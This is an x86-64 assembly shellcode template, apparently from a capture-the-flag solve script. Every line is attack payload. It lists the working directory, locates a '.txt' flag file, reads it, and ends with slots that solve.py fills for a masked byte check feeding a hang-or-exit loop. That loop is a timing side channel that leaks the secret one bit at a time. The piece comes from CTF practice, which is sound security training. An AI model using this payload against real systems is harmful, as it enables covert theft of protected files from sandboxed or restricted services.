.intel_syntax noprefix
.global _start

_start:
# rax = openat(AT_FDCWD, ".", O_RDONLY)
mov rdi, -100
push 0x2e
mov rsi, rsp
xor edx, edx
mov eax, 257
syscall

# rax = getdents(fd, rsp, 0x4000)
mov edi, eax
mov rsi, rsp
mov edx, 0x4000
push 78
pop rax
syscall

# loop over all entries and search for flag file.
# the flag file is the only one matching [A-Za-z0-9]*\.txt
xor ecx, ecx
xor esi, esi
loop_0:
cmp ecx, eax
jge loop_0_end

lea rdi, [rsp + rcx + 0x12]
loop_1:
cmp byte ptr [rdi], 0
je loop_1_end
inc rdi
jmp loop_1
loop_1_end:

cmp dword ptr [rdi - 4], 0x7478742e
je read_flag

mov si, word ptr [rsp + rcx + 0x10]
add ecx, esi
jmp loop_0
loop_0_end:

read_flag:
# rax = openat(AT_FDCWD, <flag_filename>, O_RDONLY)
mov rdi, -100
lea rsi, [rsp + rcx + 0x12]
xor edx, edx
mov eax, 257
syscall

# read(rax, rsp, 0x1000)
mov edi, eax
mov rsi, rsp
mov edx, 0x1000
xor eax, eax
syscall

# hang or exit
%s	# leave this to be filled by solve.py
and byte ptr [rsp + %d], %d	# replace with the mask and index of the flag string you want to check. These are replaced in solve.py.
infinite_loop:
jz infinite_loop

